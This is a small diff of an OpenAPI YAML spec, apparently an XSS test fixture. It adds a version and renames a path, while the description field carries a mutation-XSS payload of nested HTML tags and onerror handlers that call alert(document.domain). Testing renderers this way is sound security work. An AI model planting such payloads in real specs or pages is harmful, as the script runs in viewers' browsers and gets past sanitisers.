@@ -3,8 +3,9 @@ info:
   title: Example yaml.spec
   description: |
     <ny1z4xk9 src=x onerror=alert(1)><math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(document.domain)'>">
+  version: 0.1
 paths:
-  /accounts:
+  /TEST:
     get:
       responses:
         '200':
